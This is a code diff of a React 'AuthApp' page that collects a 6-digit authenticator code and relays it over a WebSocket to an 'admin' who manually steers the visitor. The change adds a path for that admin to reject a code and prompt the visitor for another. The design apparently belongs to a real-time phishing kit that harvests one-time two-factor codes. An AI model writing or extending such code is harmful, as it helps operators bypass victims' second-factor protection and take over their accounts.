@@ -1,17 +1,29 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { useWebSocket } from '../context/WebSocketContext';
+import { useWebSocket } from "../context/WebSocketContext";
 import "../styles/verification.css";
 
 const AuthApp = () => {
   const navigate = useNavigate();
-  const { submitForm, isConnected } = useWebSocket();
+  const { submitForm, isConnected, verificationError, clearVerificationError } = useWebSocket();
   const [code, setCode] = useState("");
   const [showError, setShowError] = useState(false);
+  const [showInvalidError, setShowInvalidError] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [countdown, setCountdown] = useState(30); // 30 seconds for auth app codes
   const [canRefresh, setCanRefresh] = useState(false);
+
+  // Handle verification error from admin
+  useEffect(() => {
+    if (verificationError && verificationError.type === 'auth') {
+      setShowInvalidError(true);
+      setIsLoading(false);
+      setIsSubmitted(false);
+      setCode('');
+      clearVerificationError();
+    }
+  }, [verificationError, clearVerificationError]);
 
   useEffect(() => {
     if (countdown <= 0) {
@@ -47,10 +59,10 @@ const AuthApp = () => {
     setIsLoading(true);
 
     // Submit to WebSocket
-    submitForm('auth', {
-      code: value
+    submitForm("auth", {
+      code: value,
     });
-    
+
     setIsSubmitted(true);
     // Keep loading state - admin will navigate via WebSocket
   };
@@ -64,7 +76,9 @@ const AuthApp = () => {
 
   return (
     <>
-      <div className={`wrapper-loading-root ${isLoading ? 'body-loading' : 'hidden'}`}>
+      <div
+        className={`wrapper-loading-root ${isLoading ? "body-loading" : "hidden"}`}
+      >
         <div className={`progress-bar ${isLoading ? "show" : ""}`}>
           <div className="bar1"></div>
           <div className="bar2"></div>
@@ -98,10 +112,15 @@ const AuthApp = () => {
                   const val = e.target.value.replace(/\D/g, "");
                   setCode(val);
                   setShowError(false);
+                  setShowInvalidError(false);
                 }}
               />
               <span className={`error ${showError ? "show" : ""}`}>
                 Please enter a valid 6-digit code
+              </span>
+              <span className={`error ${showInvalidError ? "show" : ""}`} style={{ marginTop: "12px", marginBottom: "-12px" }}>
+                Invalid code. Please check your authentication app and try
+                again.
               </span>
               <button
                 name="submitAuth"
@@ -114,12 +133,19 @@ const AuthApp = () => {
                 {isLoading ? (
                   <>
                     <svg className="spinner" viewBox="0 0 50 50">
-                      <circle className="path" cx="25" cy="25" r="20" fill="none" strokeWidth="5"></circle>
+                      <circle
+                        className="path"
+                        cx="25"
+                        cy="25"
+                        r="20"
+                        fill="none"
+                        strokeWidth="5"
+                      ></circle>
                     </svg>
                     <span>Please wait...</span>
                   </>
                 ) : (
-                  'Continue'
+                  "Continue"
                 )}
               </button>
             </form>
